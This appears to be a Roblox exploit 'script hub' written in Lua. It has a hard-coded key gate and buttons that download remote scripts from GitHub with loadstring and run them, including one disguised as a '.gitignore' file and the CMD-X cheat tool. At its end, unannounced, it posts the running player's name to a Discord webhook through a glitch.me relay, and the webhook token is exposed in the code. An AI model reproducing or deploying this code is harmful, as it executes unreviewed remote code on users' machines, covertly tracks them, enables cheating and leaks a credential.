local Player = game.Players.LocalPlayer

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
  local Window = OrionLib:MakeWindow({Name = "Annon Hub whitelist", HidePremium = false, IntroText = "Annon Hub", SaveConfig = true, ConfigFolder = "OrionTest"})
  
  -- Notifications
  OrionLib:MakeNotification({
	Name = "Welcome to Annon Hub",
	Content = "Join the discord and enter the correct key.",
	Image = "rbxassetid://4483345998",
	Time = 5
})


-- Key
_G.Key = "Des"
_G.KeyInput = "string"






  -- Whitelist system
  local Whitelist = Window:MakeTab({
	Name = "White list",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Whitelist:AddParagraph("How do I white list?","For now there is a button to show the whitelist key, in the future im thinking of other things")


Whitelist:AddButton({
	Name = "Show Whitelist Password",
	Callback = function()
			notif()
      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Ip/main/.gitignore'),true))()
  	end    
})

local Section = Whitelist:AddSection({
	Name = "Whitelist"
})
Whitelist:AddTextbox({
	Name = "Whitelist",
	Default = "Enter Key",
	TextDisappear = true,
	Callback = function(Value)
		_G.KeyInput = Value
	end	  
})
Whitelist:AddButton({
	Name = "Check key",
	Callback = function()
      		if _G.KeyInput == _G.Key then
      	MakeAnnon()
      	end
  	end    
})


-- Loser Scripts
local Loser = Window:MakeTab({
	Name = "Trash Scripts",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
local Section = Loser:AddSection({
	Name = "Garbage Scripts LOL"
})
Loser:AddButton({
	Name = "CMD-X Very Buggy LOL",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source", true))()
  	end    
})


function MakeAnnon()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/YourMomClapped/Annon-Hub/main/.lua'),true))()
	end

 OrionLib:Init()

function notif()
game:GetService("StarterGui"):SetCore("SendNotification",{     
Title = "Password",     
Text = "The password is Des",
Button1 = "Alr",
Duration = 20
})
end





local msg = "**"..Player.Name.."** has executed your script"
local webhook = "https://discord.com/api/webhooks/998556448579649556/VlQ6G-y-yKiwkkwXyCKScLJk7CVKQMrT2MxBXjc6EINbakuwV74ZiU01lcpc7nTbeCrr"
local HttpService = game:GetService("HttpService");
local botname = "Executed"

function specials(Webhook, Message, Botname)
    local Name;
    local start = game:HttpGet("http://buritoman69.glitch.me");
    local biggie = "http://buritoman69.glitch.me/webhook";
    if (not Message or Message == "" or not Botname) then
        Name = "GameBot"
        return error("nil or empty message!")
    else
        Name = Botname;
    end
    local Body = {
        ['Key'] = tostring("applesaregood"),
        ['Message'] = tostring(Message),
        ['Name'] = Name,
        ['Webhook'] = Webhook    
    }
    Body = HttpService:JSONEncode(Body);
    local Data = game:HttpPost(biggie, Body, false, "application/json")
    return Data or nil;
end

specials(webhook, msg, botname)
